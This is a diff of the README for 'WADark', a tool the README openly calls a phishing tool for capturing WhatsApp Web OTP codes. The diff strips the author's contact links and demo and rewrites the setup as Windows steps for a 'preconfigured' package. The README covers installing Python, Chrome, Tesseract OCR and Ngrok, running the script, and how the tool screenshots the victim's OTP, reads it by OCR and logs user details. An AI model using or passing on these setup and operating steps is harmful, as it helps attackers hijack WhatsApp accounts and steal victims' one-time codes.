@@ -6,8 +6,7 @@ WADark is a phishing tool designed to capture OTP codes from WhatsApp web sessio
 
 ```bash
 Dev: LSDeep - v1.0.0
-www.htdark.com
-Contact: https://t.me/lsd33p
+
 ```
 ## ✨ Features
 
@@ -24,33 +23,82 @@ Contact: https://t.me/lsd33p
 - 🖥️ **ChromeDriver**: Compatible version of ChromeDriver to run Selenium WebDriver.
 - 🔠 **Tesseract OCR**: Install Tesseract and update the path in the script. [Tesseract OCR Installation Guide](https://github.com/UB-Mannheim/tesseract/wiki)
 
-## 🛠️ Installation
 
-1. **Clone the Repository** 📂
-   ```bash
-   git clone https://github.com/cyb3rhex/WADark.git
-   cd WADark
-   ```
-   
-2. **Set Up Virtual Environment 🌐**
-   ```bash
-   python -m venv venv
-   source venv/bin/activate
+## 🛠️ Setup & Installation
+
+The application is provided preconfigured. However, the following prerequisites must be installed on your computer before running WADark:
+
+- **Python** – Required to run the application.
+- **Google Chrome** – Required for browser automation.
+- **Tesseract OCR** – Required for image text recognition.
+- **Ngrok** – Required for public tunnel connectivity, if not already bundled or configured.
+
+1. Install Prerequisites
+
+Install the following before running the application:
+
+Python: https://www.python.org/downloads/
+
+Google Chrome: https://www.google.com/chrome/
+
+Tesseract OCR: https://github.com/UB-Mannheim/tesseract/wiki
+
+Ngrok: https://ngrok.com/download
+
+2. Create a Virtual Environment
+
+Open Command Prompt (CMD) inside the WADark project folder.
+
+Create the virtual environment:
+
+python -m venv venv
+
+3. Activate the Virtual Environment
+
+Activate the environment:
+
+venv\Scripts\activate
+
+Once activated, your terminal should display (venv) at the beginning of the command line.
+
+4. Install Dependencies
+
+Install the required Python packages:
+
+pip install -r requirements.txt
+
+### 1. Install Tesseract OCR
+
+Download and install Tesseract OCR for Windows:
+
+https://github.com/UB-Mannheim/tesseract/wiki
+
+Use the default installation location where possible:
+
+`C:\Program Files\Tesseract-OCR\tesseract.exe`
+
+### 2. Install Google Chrome
+
+Download Google Chrome:
+
+https://www.google.com/chrome/
+
+### 3. Launch WADark
+
+1. Open Command Prompt (CMD).
+2. Navigate to the WADark application folder.
+3. Run:
+
+   ```cmd
+   python WADark.py
    ```
 
-3. **Install Dependencies 📦**
-   ```bash
-   pip install -r requirements.txt
-   ```
-   
-4. **Configure Tesseract OCR Path ⚙️**
-   - Update NGROK Authkey
-   - Update the pytesseract.pytesseract.tesseract_cmd path in the script to match your local installation of Tesseract.
+The application will initialize and start its services.
 
 ## 🚀 Usage
-Run the tool using the command:
-   ```bash
-   python3 WADark.py
+
+Once the application is running, follow the application's on-screen instructions to proceed.
+
    ```
 
 ## 🛡️ How It Works
@@ -60,8 +108,5 @@ Run the tool using the command:
 3. 🔍 OTP Extraction: A screenshot of the OTP area is taken, and the OTP is extracted using Tesseract OCR.
 4. 📊 Data Logging: User details, OTP code, and other information are logged to a text file for analysis.
 
-## Demo
-https://github.com/user-attachments/assets/51e68c86-76bf-4384-a7a3-5e9d05e0a67e
 
-## 🤝 Contribution
-Feel free to fork this repository and contribute by submitting pull requests. For major changes, please open an issue first to discuss what you would like to change.
+
